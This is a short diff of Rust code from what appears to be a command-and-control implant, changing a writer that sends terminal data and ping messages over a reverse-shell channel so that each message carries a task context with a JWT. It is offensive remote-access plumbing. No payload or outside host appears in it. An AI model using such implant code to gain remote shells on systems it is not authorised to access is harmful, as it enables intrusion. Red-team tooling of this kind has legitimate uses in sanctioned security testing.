@@ -9,15 +9,19 @@ use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
 pub struct VtWriter {
     pub tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     pub task_id: i64,
+    pub jwt: String,
 }
 
 impl std::io::Write for VtWriter {
     fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
         let data = buf.to_vec();
         match self.tx.blocking_send(ReverseShellRequest {
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Data.into(),
             data,
-            task_id: self.task_id,
         }) {
             Ok(_) => Ok(buf.len()),
             Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
@@ -26,9 +30,12 @@ impl std::io::Write for VtWriter {
 
     fn flush(&mut self) -> std::io::Result<()> {
         match self.tx.blocking_send(ReverseShellRequest {
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
-            task_id: self.task_id,
         }) {
             Ok(_) => Ok(()),
             Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
